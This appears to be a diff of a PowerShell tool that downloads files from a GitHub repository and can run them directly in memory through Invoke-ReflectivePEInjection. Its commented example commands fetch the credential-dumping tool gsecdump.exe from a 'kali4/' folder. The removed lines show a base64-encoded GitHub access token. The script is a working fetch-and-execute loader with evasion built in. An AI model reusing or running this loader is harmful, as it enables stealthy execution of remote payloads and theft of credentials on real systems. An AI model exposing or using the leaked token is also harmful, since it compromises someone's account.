@@ -2924,43 +2924,26 @@ Use this script to download files from GitHub and store on disk or run in memory
     [String]
     $GHRepo,
 
-    [Parameter(Position = 2, Mandatory = $True)]
-    [String]
-    $GHPAT, # This should be base64 encoded
 
-    [Parameter(Position =3, Mandatory = $True)]
+    [Parameter(Position =2, Mandatory = $True)]
     [String]
     $GHFilePath,
 
-    [Parameter(Position = 4, Mandatory = $True)]
+    [Parameter(Position = 3, Mandatory = $True)]
     [String]
     $GHFileName,
 
-    [Parameter(Position = 5, Mandatory=$True, ParameterSetName="WriteContentToDisk")]
+    [Parameter(Position = 4, Mandatory=$True, ParameterSetName="WriteContentToDisk")]
     [String]
     $LocalFilePath,
 	
-    [Parameter(Position = 5, Mandatory=$True, ParameterSetName="ExecutionCommands")]
+    [Parameter(Position = 4, Mandatory=$True, ParameterSetName="ExecutionCommands")]
     [String]
     $CommandArgs
 
 
     )
 
-
-
-    # Decode the GitHub Personal Access Token
-    $GHPAT = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($GHPAT))
-
-    # Get the PAT in the correct format
-    $Token = $GHUser + ":" + $GHPAT
-
-    # Convert this to Base64
-    $Base64Token = [System.Convert]::ToBase64String([char[]]$Token)
-    
-    $Headers = @{
-        Authorization =  'Basic {0}' -f $Base64Token;
-    };
 
     # Construct the api of the file to download
     $GHAPI = "https://api.github.com/repos/" + $GHUser + "/" + $GHRepo + "/contents/" + $GHFilePath + $GHFileName
@@ -2974,11 +2957,6 @@ Use this script to download files from GitHub and store on disk or run in memory
     Try {
         # Don't actually need the header
         $content = Invoke-RestMethod -Uri $GHAPI -Body $Body -Method Get -ErrorAction SilentlyContinue
-        
-        #$sha = $content.sha
-        #write-host $content.content
-        #write-host $content.url
-        #write-host $content.git_url
 
         $fileBytes = [System.Convert]::FromBase64String(($content.content))
 
@@ -2987,16 +2965,16 @@ Use this script to download files from GitHub and store on disk or run in memory
 	{
 		$outFile = $LocalFilePath + $GHFileName
 		[System.IO.File]::WriteAllBytes($outFile, $fileBytes)
+		
 	}
 		
 	if ($PsCmdlet.ParameterSetName -eq "ExecutionCommands")
 	{
-	    # To run the exe in memory use Invoke-ReflectivePEInjection
-            $output = Invoke-ReflectivePEInjection -PEBytes $fileBytes -ExeArgs $CommandArgs
-        }		
+		# To run the exe in memory use Invoke-ReflectivePEInjection
+		$output = Invoke-ReflectivePEInjection -PEBytes $fileBytes -ExeArgs $CommandArgs
+            	#Write-Host $output
+	}		
 		
-
-        
     }
     Catch {        
         $ErrorMessage = "Trying to get file contents: " + $_.Exception.Message;
@@ -3006,8 +2984,8 @@ Use this script to download files from GitHub and store on disk or run in memory
 
 }
 
-#Invoke-GetContentFromGitHub -GHUser nnh100 -GHRepo uploads -GHPAT "zI5M2Q4ODM2MzBjMTRlNmJlZmE0YjA4ZmJmYjYyZjU2YmI1N2YwZA==" -GHFilePath "kali4/" -GHFileName "gsecdump.exe" -LocalFilePath "c:\temp\"
+#Invoke-GetContentFromGitHub -GHUser nnh100 -GHRepo uploads -GHFilePath "kali4/" -GHFileName "gsecdump.exe" -LocalFilePath "c:\temp\"
 
-#Invoke-GetContentFromGitHub -GHUser nnh100 -GHRepo uploads -GHPAT "zI5M2Q4ODM2MzBjMTRlNmJlZmE0YjA4ZmJmYjYyZjU2YmI1N2YwZA==" -GHFilePath "kali4/" -GHFileName "whois64.exe" -CommandArgs "www.google.com"
+#Invoke-GetContentFromGitHub -GHUser nnh100 -GHRepo uploads -GHFilePath "kali4/" -GHFileName "whois64.exe" -CommandArgs "www.google.com"
 
 
